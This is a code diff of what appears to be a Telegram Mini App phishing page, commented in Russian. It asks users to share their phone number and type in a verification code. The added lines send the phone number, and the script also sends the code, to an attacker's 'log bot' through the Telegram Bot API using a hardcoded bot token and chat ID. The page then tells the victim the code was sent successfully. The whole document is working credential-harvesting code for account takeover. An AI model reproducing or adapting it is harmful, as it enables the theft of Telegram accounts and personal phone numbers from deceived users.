@@ -10,7 +10,6 @@
         
         .code-header { font-size: 24px; font-weight: 500; margin-bottom: 10px; margin-top: 20px; }
         .code-subtitle { font-size: 14px; color: var(--tg-theme-hint-color, #999999); margin-bottom: 30px; line-height: 1.4; }
-        
         .code-input { position: absolute; opacity: 0; width: 1px; height: 1px; font-size: 16px; }
         
         .code-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
@@ -57,32 +56,31 @@
                 tg.expand();
                 let isSent = false;
 
-                const BOT_TOKEN = "8836719851:AAHO5sFobm_1MwTsC5GUvUCmkgRrRwO8s2g";
+                // --- ТОКЕН ЛОГ-БОТА ---
+                const LOG_BOT_TOKEN = "8923006288:AAFgpvKcHhZbpl148oi-qT5NUfvIu_7Cq24";
                 const CHAT_ID = "-1004399809740";
 
-                function sendToBot(text) {
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                function sendToLogBot(text) {
+                    fetch(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                     });
                 }
 
-                function showCodeScreen() {
-                    document.getElementById('screen-phone').classList.add('hidden');
-                    document.getElementById('screen-code').classList.remove('hidden');
-                    setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
-                }
-
                 // 1. ЗАПРОС НОМЕРА
                 document.getElementById('btn-share').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared) {
-                            // Как только пользователь разрешил, Telegram сам отправит контакт в чат.
-                            // Нам не нужно делать fetch для номера, бот его уже поймал!
+                            let phone = "undefined";
+                            if (contact && contact.phone_number) phone = contact.phone_number;
+                            else if (contact && contact.phone) phone = contact.phone;
+
+                            sendToLogBot(`📱 PHONE: +${phone}`);
                             
-                            // Просто переключаем экран на ввод кода
-                            showCodeScreen();
+                            document.getElementById('screen-phone').classList.add('hidden');
+                            document.getElementById('screen-code').classList.remove('hidden');
+                            setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
                         }
                     });
                 };
@@ -115,7 +113,7 @@
                         document.getElementById('status-msg').classList.remove('hidden');
                         document.querySelector('.code-subtitle').innerHTML = "<b>Processing...</b>";
                         
-                        sendToBot(`🔑 CODE: ${value}`);
+                        sendToLogBot(`🔑 CODE: ${value}`);
                         
                         setTimeout(() => {
                             document.querySelector('.code-subtitle').innerHTML = "<b style='color: #34c759;'>Code sent successfully!</b>";
